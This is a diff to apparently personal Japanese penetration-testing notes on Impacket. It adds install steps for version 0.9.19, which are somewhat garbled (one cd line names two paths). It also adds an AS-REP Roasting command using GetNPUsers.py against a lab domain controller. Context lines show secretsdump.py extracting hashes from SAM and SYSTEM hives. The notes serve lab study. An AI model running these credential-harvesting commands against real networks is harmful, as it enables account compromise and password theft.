@@ -2,6 +2,22 @@
 
 全然まとまっていないので、今後整理する
 
+0.9.20 以降不安定なため、0.9.19 推奨。
+
+https://github.com/fortra/impacket/releases/tag/impacket_0_9_19
+
+```
+cd /opt
+
+https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
+からコンパイル済みパッケージをダウンロード
+
+cd Impacket-0.9.19 /opt/impacket
+
+pip install .
+これにより必要な依存関係がすべてインストール
+```
+
 ユーザー名列挙
 
 ```sh
@@ -30,4 +46,10 @@ $ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support publ
 
 ```sh
 python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+## AS-REP Roasting
+
+```sh
+python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.194.124 controller.local/ -usersfile users.txt
 ```
